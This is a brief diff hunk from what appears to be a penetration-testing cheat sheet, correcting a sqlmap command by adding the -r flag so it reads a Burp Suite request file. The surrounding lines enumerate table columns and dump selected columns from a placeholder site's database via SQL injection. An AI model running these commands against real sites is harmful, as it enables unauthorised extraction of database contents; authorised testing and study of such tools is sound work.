@@ -6,7 +6,7 @@
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name --columns
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name -C columns_name1,columns_name2,columns_name3 --dump
     
-    $ sqlmap burpsuite_copy_to_file.txt -p username --batch --dump
+    $ sqlmap -r burpsuite_copy_to_file.txt -p username --batch --dump
 
 
 
